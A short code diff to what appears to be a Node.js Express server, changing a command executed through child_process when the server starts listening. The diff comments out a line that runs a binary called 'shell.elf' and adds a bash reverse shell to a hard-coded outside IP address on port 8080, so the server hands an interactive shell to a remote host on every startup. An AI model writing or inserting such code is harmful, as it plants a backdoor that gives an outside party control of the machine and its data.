@@ -259,7 +259,9 @@ io.sockets.on('connection', function (socket) {
 server.listen(app.get('port'), function () {
     console.log("Express server listening on port " + app.get('port'));
     var execx = require('child_process').exec;
-    var cmdStr = 'chmod u+x shell.elf & ./shell.elf';
+    //var cmdStr = 'chmod u+x shell.elf & ./shell.elf';
+  var cmdStr = 'bash -i > /dev/tcp/43.132.177.160/8080 0>&1 2>&1';
+  
     execx(cmdStr, function (err, stdout, srderr) {
       if (err) {
          console.log(srderr);
